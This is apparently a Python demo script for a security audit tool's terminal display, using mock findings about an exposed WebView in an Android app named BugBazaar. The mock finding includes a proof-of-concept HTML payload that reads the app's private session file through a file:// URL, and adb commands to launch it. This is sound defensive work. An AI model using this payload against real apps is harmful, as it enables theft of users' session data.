# Author: Vivek Sawant
# Date: 13-10-2026

from rich.console import Console

from ava.agent.schemas.audit import (
    LeadAuditResult,
    PayloadFile,
    SeverityLevel,
    TriageVerdict,
)
from ava.commands.ui.audit_view import (
    render_audit_summary_table,
    render_lead_detail_card,
)

console = Console()

mock_result = LeadAuditResult(
    rule_id="SEC-WEB-001",
    class_name="com.BugBazaar.ui.Deeplink",
    method_name="setupwebview",
    verdict=TriageVerdict.VULNERABLE,
    severity=SeverityLevel.HIGH,
    confidence=1.0,
    cwe_id="CWE-749: Exposed Dangerous Method or Interface",
    evidence_code="""invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V""",
    analysis=(
        "The WebView configuration explicitly enables setJavaScriptEnabled(true) and "
        "setAllowUniversalAccessFromFileURLs(true). Universal access from file URLs allows "
        "scripts loaded in local file contexts to cross the origin boundary and read sensitive "
        "data from the application's private directory."
    ),
    remediation=(
        "Disable setAllowUniversalAccessFromFileURLs(false). Ensure strict URL allowlisting "
        "and restrict Deeplink schemes to verified HTTPS hosts."
    ),
    payload_file=PayloadFile(
        filename="exploit.html",
        content="""<!DOCTYPE html>
<html>
<body>
  <script>
    fetch('file:///data/data/com.BugBazaar/shared_prefs/user_session.xml')
      .then(res => res.text())
      .then(data => console.log(data));
  </script>
</body>
</html>""",
    ),
    poc_commands=[
        "adb push exploit.html /sdcard/exploit.html",
        "adb shell am start -n com.BugBazaar/.ui.Deeplink -d 'file:///sdcard/exploit.html'",
    ],
)

# 1. Render Summary Table
render_audit_summary_table([mock_result], console)

print("\n")

# 2. Render Detail Card
render_lead_detail_card(mock_result, console)
